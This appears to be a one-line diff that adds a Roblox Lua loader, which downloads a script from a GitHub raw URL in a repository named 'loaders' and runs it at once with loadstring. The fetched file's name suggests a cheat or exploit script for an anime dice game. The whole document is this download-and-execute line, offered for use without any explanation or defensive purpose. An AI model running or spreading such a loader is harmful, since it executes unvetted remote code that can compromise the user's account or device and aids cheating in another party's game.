@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/anime-dice-spam7-5b937z2dibjqmz.lua"))()
